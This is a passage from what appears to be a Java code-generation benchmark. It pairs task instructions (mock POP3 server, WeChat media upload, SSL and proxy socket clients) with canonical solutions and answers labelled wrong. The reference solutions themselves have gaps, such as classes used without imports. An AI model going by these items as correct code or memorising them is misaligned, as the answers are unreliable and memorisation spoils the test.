    "Instruction": "Task Description: Create a mock POP3 server class that simulates interactions with a client using TCP sockets for testing purposes.\n\nClass Description: The MockPop3Server class implements a simple POP3 server mock that can be used for testing email client implementations. It handles client connections, processes commands, and manages server shutdown. The server runs in a separate thread and maintains a queue of expected interactions.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of expected client-server interactions\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for connection closure\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- mockServerThread: MockServerThread - The thread running the server\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread\n- shutdown() -> void - Signals the server thread to stop and cleans up resources\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread\n- run() -> void - Main server thread execution that handles client connections and commands\n- handleInteractions() -> void - Processes the queued interactions with the client\n- readAdditionalCommands() -> void - Reads any additional unexpected commands from the client\n- readLine() -> String - Reads a line of input from the client socket\n- shouldStop() -> void - Signals the thread to stop execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    \n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        InetSocketAddress localSocketAddress = (InetSocketAddress) serverSocket.getLocalSocketAddress();\n        host = localSocketAddress.getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        \n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            super(\"MockPop3Server\");\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = readLine();\n            if (command == null) {\n                throw new IOException(\"Connection closed\");\n            }\n        }\n\n        private String readLine() throws IOException {\n            return clientSocket.getInputStream().read() != -1 ? \"command\" : null;\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\nimport java.util.Deque;\n\npublic class MockPop3Server {\n    protected Deque<ImapInteraction> interactions;\n    protected CountDownLatch waitForConnectionClosed;\n    protected CountDownLatch waitForAllExpectedCommands;\n    protected MockServerThread mockServerThread;\n    protected String host;\n    protected int port;\n\n    public MockPop3Server(Deque<ImapInteraction> interactions) {\n        this.interactions = interactions;\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(interactions.size());\n    }\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(0);\n        host = \"localhost\";\n        port = serverSocket.getLocalPort();\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n        }\n    }\n\n    private class MockServerThread extends Thread {\n        private ServerSocket serverSocket;\n        private Deque<ImapInteraction> interactions;\n        private CountDownLatch waitForConnectionClosed;\n        private CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean stop = false;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        public void run() {\n            try (Socket clientSocket = serverSocket.accept()) {\n                handleInteractions(clientSocket);\n                readAdditionalCommands(clientSocket);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                waitForConnectionClosed.countDown();\n            }\n        }\n\n        private void handleInteractions(Socket socket) throws IOException {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n\n            for (ImapInteraction interaction : interactions) {\n                if (stop) break;\n\n                if (interaction.getServerResponse() != null) {\n                    out.write(interaction.getServerResponse());\n                    out.newLine();\n                    out.flush();\n                }\n\n                if (interaction.getClientCommand() != null) {\n                    String line;\n                    do {\n                        line = in.readLine();\n                        if (line == null || line.equals(interaction.getClientCommand())) {\n                            break;\n                        }\n                    } while (!stop);\n                }\n\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private void readAdditionalCommands(Socket socket) throws IOException {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String line;\n            while ((line = in.readLine()) != null && !stop) {\n            }\n        }\n\n        private void shouldStop() {\n            stop = true;\n        }\n    }\n\n    public String getHost() {\n        return host;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n\nclass ImapInteraction {\n    private String clientCommand;\n    private String serverResponse;\n\n    public ImapInteraction(String clientCommand, String serverResponse) {\n        this.clientCommand = clientCommand;\n        this.serverResponse = serverResponse;\n    }\n\n    public String getClientCommand() {\n        return clientCommand;\n    }\n\n    public String getServerResponse() {\n        return serverResponse;\n    }\n}\n```"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Implement a utility class for handling media uploads to the WeChat API, including processing file types and managing HTTP connections for file transfer.\n\nClass Description: WechatMediaUtil is a Spring component that provides functionality to upload media files to WeChat's servers through their API. It handles authentication, file type validation, and multipart form data submission.\n\nAttributes:\n- wechatAccessTokenUtil: [WechatAccessTokenUtil] - Autowired dependency for managing WeChat access tokens\n- MEDIA_URL: [String] - Constant URL template for WeChat media upload API (contains ACCESS_TOKEN and TYPE placeholders)\n\nMethods:\n- uploadMedia: [uploadMedia](String type, String mediaFileUrl) -> String - Uploads a media file to WeChat servers. Takes media type and file URL as input, returns WeChat media ID. Handles token refresh on expiration and error cases.\n- judgeType: [judgeType](String contentType) -> String - Determines file extension from content type. Throws exception for unsupported types. Used internally by uploadMedia.\n\nInput for uploadMedia:\n- type: [String] - Media type (e.g., \"image\")\n- mediaFileUrl: [String] - URL of the media file to upload\n\nOutput for uploadMedia:\n- [String] - WeChat media ID of the uploaded file\n\nInput for judgeType:\n- contentType: [String] - MIME type of the file\n\nOutput for judgeType:\n- [String] - Corresponding file extension (e.g., \".jpg\")",
    "Canonical_solution": "import cn.hutool.json.JSONObject;\nimport cn.lili.common.enums.ClientTypeEnum;\nimport cn.lili.common.enums.ResultCode;\nimport cn.lili.common.exception.ServiceException;\nimport cn.lili.modules.wechat.util.WechatAccessTokenUtil;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\n@Component\npublic class WechatMediaUtil {\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.cgiAccessToken(ClientTypeEnum.WECHAT_MP);\n        String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=ACCESS_TOKEN&type=TYPE\";\n\n        StringBuffer resultStr = null;\n        String mediaStr = MEDIA_URL.replace(\"ACCESS_TOKEN\", accessToken).replace(\"TYPE\", type);\n        URL mediaUrl;\n        try {\n            String boundary = \"----WebKitFormBoundaryOYXo8heIv9pgpGjT\";\n            URL url = new URL(mediaStr);\n            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();\n            urlConn.setDoInput(true);\n            urlConn.setDoOutput(true);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n            urlConn.setRequestMethod(\"POST\");\n            OutputStream out = urlConn.getOutputStream();\n\n            mediaUrl = new URL(mediaFileUrl);\n            HttpURLConnection mediaConn = (HttpURLConnection) mediaUrl.openConnection();\n            mediaConn.setRequestMethod(\"GET\");\n            mediaConn.setDoInput(true);\n            String contentType = mediaConn.getHeaderField(\"Content-Type\");\n            String fileExt = judgeType(contentType);\n            InputStream in = mediaConn.getInputStream();\n            BufferedInputStream bufferedIn = new BufferedInputStream(in);\n            byte[] bytes = new byte[1024];\n            int size = 0;\n            out.write((\"--\" + boundary + \"\\r\\n\").getBytes());\n            out.write((\"Content-Disposition: form-data; name=\\\"media\\\";\\r\\n\"\n                    + \"filename=\\\"\" + (System.currentTimeMillis()) + fileExt + \"\\\"\\r\\n\"\n                    + \"Content-Type: \" + contentType + \"\\r\\n\\r\\n\").getBytes());\n            while ((size = bufferedIn.read(bytes)) != -1) {\n                out.write(bytes, 0, size);\n            }\n            out.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n\n            bufferedIn.close();\n            in.close();\n            mediaConn.disconnect();\n\n            InputStream resultIn = urlConn.getInputStream();\n            InputStreamReader reader = new InputStreamReader(resultIn);\n            BufferedReader bufferedReader = new BufferedReader(reader);\n            String tempStr = null;\n            resultStr = new StringBuffer();\n            while ((tempStr = bufferedReader.readLine()) != null) {\n                resultStr.append(tempStr);\n            }\n            bufferedReader.close();\n            reader.close();\n            resultIn.close();\n            urlConn.disconnect();\n        } catch (Exception e) {\n            log.error(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20\u5931\u8d25\", e);\n        }\n        assert resultStr != null;\n        JSONObject jsonObject = new JSONObject(resultStr.toString());\n        log.info(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20:\" + jsonObject);\n        if (jsonObject.get(\"errcode\") != null && (\"40001\").equals(jsonObject.get(\"errcode\"))) {\n            wechatAccessTokenUtil.removeAccessToken(ClientTypeEnum.WECHAT_MP);\n            return this.uploadMedia(type, mediaFileUrl);\n        } else if (jsonObject.get(\"errcode\") != null) {\n            throw new ServiceException(jsonObject.get(\"errmsg\").toString());\n        } else {\n            return jsonObject.get(\"media_id\").toString();\n        }\n    }\n\n    public String judgeType(String contentType) {\n        String fileExt = \"\";\n        switch (contentType) {\n            case \"image/png\":\n                fileExt = \".png\";\n                break;\n            case \"image/jpeg\":\n                fileExt = \".jpeg\";\n                break;\n            case \"image/jpg\":\n                fileExt = \".jpg\";\n                break;\n            default:\n                throw new ServiceException(ResultCode.IMAGE_FILE_EXT_ERROR);\n        }\n        return fileExt;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport org.springframework.http.*;\nimport org.springframework.web.client.RestTemplate;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.util.*;\n\n@Component\npublic class WechatMediaUtil {\n\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    private static final String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=%s&type=%s\";\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        try {\n            String accessToken = wechatAccessTokenUtil.getAccessToken();\n            String fileExtension = judgeType(getContentType(new URL(mediaFileUrl)));\n            File tempFile = downloadFile(mediaFileUrl, fileExtension);\n            String mediaId = uploadToWeChat(accessToken, type, tempFile);\n            tempFile.delete();\n            return mediaId;\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to upload media to WeChat\", e);\n        }\n    }\n\n    private String getContentType(URL url) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"HEAD\");\n        return connection.getContentType();\n    }\n\n    private File downloadFile(String fileUrl, String extension) throws IOException {\n        URL url = new URL(fileUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setConnectTimeout(5000);\n        connection.setReadTimeout(10000);\n\n        if (connection.getResponseCode() != 200) {\n            throw new IOException(\"Failed to download file from URL: \" + fileUrl);\n        }\n\n        File tempFile = Files.createTempFile(\"wechat_media_\", extension).toFile();\n        try (InputStream in = connection.getInputStream(); FileOutputStream out = new FileOutputStream(tempFile)) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n        }\n        return tempFile;\n    }\n\n    private String uploadToWeChat(String accessToken, String type, File file) throws IOException {\n        String uploadUrl = String.format(MEDIA_URL, accessToken, type);\n        RestTemplate restTemplate = new RestTemplate();\n\n        HttpHeaders headers = new HttpHeaders();\n        headers.setContentType(MediaType.MULTIPART_FORM_DATA);\n\n        LinkedMultiValueMap<String, Object> body = new LinkedMultiValueMap<>();\n        body.add(\"media\", new FileSystemResource(file));\n\n        HttpEntity<LinkedMultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);\n        ResponseEntity<String> response = restTemplate.postForEntity(uploadUrl, requestEntity, String.class);\n\n        if (response.getStatusCode() != HttpStatus.OK) {\n            throw new IOException(\"WeChat API returned error: \" + response.getBody());\n        }\n\n        return parseMediaId(response.getBody());\n    }\n\n    private String parseMediaId(String responseBody) {\n        // Assuming JSON format like {\"media_id\":\"MEDIA_ID\"}\n        int startIndex = responseBody.indexOf(\"\\\"media_id\\\":\\\"\") + 12;\n        int endIndex = responseBody.indexOf('\"', startIndex);\n        return responseBody.substring(startIndex, endIndex);\n    }\n\n    public String judgeType(String contentType) {\n        Map<String, String> typeMap = new HashMap<>();\n        typeMap.put(\"image/jpeg\", \".jpg\");\n        typeMap.put(\"image/png\", \".png\");\n        typeMap.put(\"video/mp4\", \".mp4\");\n        typeMap.put(\"audio/mpeg\", \".mp3\");\n\n        String extension = typeMap.get(contentType);\n        if (extension == null) {\n            throw new IllegalArgumentException(\"Unsupported content type: \" + contentType);\n        }\n        return extension;\n    }\n}\n```"
  },
  {
    "Task_id": 560,
    "Instruction": "Task Description: Create a Java class that implements a secure socket client using SSL/TLS to communicate with a server. The client should be able to send HTTP requests and read responses.\n\nClass Description: The SocketClient class establishes a secure connection to a server using SSL/TLS, sends an HTTP GET request, and reads the response. It handles socket creation, SSL handshake, request sending, and response parsing.\n\nAttributes:\n- clientSslContext: [SSLContext] - The SSL context used for creating secure sockets\n- address: [InetSocketAddress] - The server address (host and port) to connect to\n\nMethods:\n- Constructor: [SocketClient]([SSLContext clientSslContext, InetSocketAddress address]) -> [void] - Initializes the client with SSL context and server address\n- doRequest: [doRequest]() -> [void] - Establishes connection, sends HTTP request, reads response, and closes connection (throws IOException)\n- readLine: [readLine]([InputStream is]) -> [String] - Helper method to read a line from input stream (throws IOException)\n- readResponse: [readResponse]([SSLSocket sslSocket]) -> [void] - Reads and processes the HTTP response headers and body (throws IOException)",
    "Canonical_solution": "import io.undertow.Undertow;\nimport io.undertow.util.Headers;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\n\npublic class SocketClient {\n\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        Socket rawSocket = new Socket();\n        rawSocket.connect(address);\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory()\n            .createSocket(rawSocket, \"localhost\", address.getPort(), false);\n        PrintWriter writer = new PrintWriter(sslSocket.getOutputStream());\n        writer.println(\"GET / HTTP/1.1\");\n        writer.println(\"Host: localhost\");\n        writer.println(\"Connection: keep-alive\");\n        writer.println();\n        writer.flush();\n        readResponse(sslSocket);\n\n        sslSocket.shutdownOutput();\n        rawSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder line = new StringBuilder();\n        while (true) {\n            int c = is.read();\n            switch (c) {\n                case -1:\n                    throw new RuntimeException(\"Unexpected EOF\");\n                case '\\r':\n                    continue;\n                case '\\n':\n                    return line.toString();\n                default:\n                    line.append((char) c);\n            }\n        }\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        String line;\n        int contentLength = 0;\n        Pattern CONTENT_LENGTH_PATTERN = Pattern.compile(\"Content-Length: ([0-9]+)\", Pattern.CASE_INSENSITIVE);\n\n        do {\n            line = readLine(sslSocket.getInputStream());\n            Matcher matcher = CONTENT_LENGTH_PATTERN.matcher(line);\n            if (matcher.matches()) {\n                contentLength = Integer.parseInt(matcher.group(1), 10);\n            }\n        } while (!line.isEmpty());\n\n        for (int i = 0; i < contentLength; i++) {\n            sslSocket.getInputStream().read();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\n\npublic class SocketClient {\n    private final SSLContext clientSslContext;\n    private final InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        SSLSocketFactory socketFactory = clientSslContext.getSocketFactory();\n        try (SSLSocket sslSocket = (SSLSocket) socketFactory.createSocket(address.getAddress(), address.getPort())) {\n            sslSocket.startHandshake();\n\n            try (OutputStream out = sslSocket.getOutputStream()) {\n                String request = \"GET / HTTP/1.1\\r\\nHost: \" + address.getHostName() + \"\\r\\nConnection: close\\r\\n\\r\\n\";\n                out.write(request.getBytes(StandardCharsets.UTF_8));\n                out.flush();\n            }\n\n            readResponse(sslSocket);\n        }\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = is.read()) != -1) {\n            if (c == '\\n') break;\n            if (c != '\\r') sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        try (InputStream in = sslSocket.getInputStream()) {\n            String line;\n            while (!(line = readLine(in)).isEmpty()) {\n                System.out.println(\"Header: \" + line);\n            }\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                System.out.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 561,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client capable of connecting to servers directly or through HTTP proxies, with support for SSL/TLS connections.\n\nClass Description: RouterSocketClient is a networking class that handles socket connections to remote servers, supporting both direct connections and HTTP proxy connections. It includes SSL/TLS capabilities and handles various connection scenarios with appropriate timeouts.\n\nAttributes:\n- TAG: [String] - Class tag for logging purposes\n- SERVER_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for server connections (20 seconds)\n- HTTP_PROXY_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for HTTP proxy connections (5 seconds)\n- TLS_HANDSHAKE_TIMEOUT_MILLIS: [int] - Timeout for TLS handshake (20 seconds)\n- mLock: [Object] - Synchronization lock object\n- mConnectivityManager: [ConnectivityManager] - Android network connectivity manager\n- mSSLSocketFactory: [SSLSocketFactory] - SSL socket factory for secure connections\n- mContext: [Context] - Android application context\n- mDelayedRestartHandler: [Handler] - Handler for delayed operations\n- mSocket: [Socket] - Current active socket connection\n- mThread: [Thread] - Thread handling socket operations\n\nMethods:\n- RouterSocketClient(Context, ConnectivityManager, Random) -> [Constructor] - Initializes the client with context, connectivity manager, and random number generator\n- connectSocket(String host, int port) -> [Socket] - Static method that establishes a socket connection to the specified host:port, handling both direct and proxy connections\n- connectSocketNoProxy(String host, int port) -> [Socket] - Static helper method for direct socket connections without proxy\n- connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) -> [Socket] - Static helper method for establishing connections through HTTP proxies using CONNECT method\n- tryEnableSni(SSLSocket socket, String hostname) -> [void] - Attempts to enable Server Name Indication (SNI) on the SSL socket\n- tryEnableSessionTickets(SSLSocket socket) -> [void] - Attempts to enable session tickets on the SSL socket",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.os.Handler;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.security.cert.X509Certificate;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.concurrent.CopyOnWriteArrayList;\n\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n\n    private static final String TAG = RouterSocketClient.class.getSimpleName();\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(\n            Context context,\n            ConnectivityManager connectivityManager,\n            Random rng) {\n        mContext = context;\n        mDelayedRestartHandler = new Handler(mContext.getMainLooper());\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n    }\n\n    private static Socket connectSocket(String host, int port) throws IOException {\n        URI serverUri = URI.create(\"https://\" + host + \":\" + port);\n        ProxySelector proxySelector = ProxySelector.getDefault();\n        List<Proxy> proxies = proxySelector.select(serverUri);\n        if ((proxies == null) || (proxies.isEmpty())) {\n            proxies = Collections.singletonList(Proxy.NO_PROXY);\n        }\n\n        IOException lastFailure = null;\n        for (Proxy proxy : proxies) {\n            SocketAddress proxyAddress = proxy.address();\n            try {\n                if (Proxy.NO_PROXY.equals(proxy)) {\n                    return connectSocketNoProxy(host, port);\n                } else if (proxy.type() == Proxy.Type.HTTP) {\n                    return connectSocketViaHttpProxyConnectMethod(host, port, proxyAddress);\n                }\n            } catch (IOException e) {\n                lastFailure = e;\n                if (proxyAddress != null) {\n                    proxySelector.connectFailed(serverUri, proxyAddress, e);\n                }\n            }\n        }\n\n        if (lastFailure != null) {\n            throw lastFailure;\n        }\n        throw new IOException(\"No suitable connection methods found for \" + serverUri + \": \" + proxies);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" directly\");\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            SocketAddress address = new InetSocketAddress(host, port);\n            socket = new Socket();\n            socket.connect(address, SERVER_CONNECT_TIMEOUT_MILLIS);\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(\n            String host, int port, SocketAddress proxyAddress) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" via HTTP proxy \" + proxyAddress);\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            InetSocketAddress proxyInetAddress = (InetSocketAddress) proxyAddress;\n            if (proxyInetAddress.isUnresolved()) {\n                proxyInetAddress = new InetSocketAddress(\n                        proxyInetAddress.getHostName(),\n                        proxyInetAddress.getPort());\n            }\n            socket = new Socket();\n            socket.connect(proxyInetAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(\n                    socket.getOutputStream(), \"US-ASCII\"));\n            out.write(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\");\n            out.write(\"Host: \" + host + \":\" + port + \"\\r\\n\");\n            out.write(\"\\r\\n\");\n            out.flush();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream(), \"US-ASCII\"));\n            String line;\n            boolean statusLineRead = false;\n            boolean responseHeadersRead = false;\n            socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            while ((line = in.readLine()) != null) {\n                if (!statusLineRead) {\n                    String[] tokens = line.split(\"\\\\s+\", 3);\n                    if (tokens.length != 3) {\n                        throw new IOException(\"Unexpected reply from HTTP proxy: \" + line);\n                    }\n                    String httpVersion = tokens[0];\n                    String statusCodeString = tokens[1];\n                    String reason = tokens[2];\n                    if (!httpVersion.startsWith(\"HTTP/1.\")) {\n                        throw new IOException(\"Unsupported HTTP version in HTTP proxy response: \" + line);\n                    }\n                    if (!\"200\".equals(statusCodeString)) {\n                        throw new IOException(\n                                \"HTTP proxy CONNECT failed. Status: \" + statusCodeString + \", reason: \" + reason);\n                    }\n                    statusLineRead = true;\n                    continue;\n                }\n                if (line.length() == 0) {\n                    responseHeadersRead = true;\n                    break;\n                }\n            }\n\n            if (!statusLineRead) {\n                throw new EOFException(\"Empty response from HTTP proxy\");\n            }\n            if (!responseHeadersRead) {\n                throw new EOFException(\"Premature end of stream while reading HTTP proxy response\");\n            }\n\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static void tryEnableSni(SSLSocket socket, String hostname) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setHostname\", String.class).invoke(socket, hostname);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable SNI via Reflection API\", e);\n        }\n    }\n\n    private static void tryEnableSessionTickets(SSLSocket socket) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setUseSessionTickets\", boolean.class).invoke(socket, true);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable session tickets via Reflection API\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.os.Handler;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.UnknownHostException;\nimport java.security.SecureRandom;\nimport java.util.Random;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n    private static final String TAG = \"RouterSocketClient\";\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(Context context, ConnectivityManager connectivityManager, Random random) {\n        mContext = context;\n        mConnectivityManager = connectivityManager;\n        try {\n            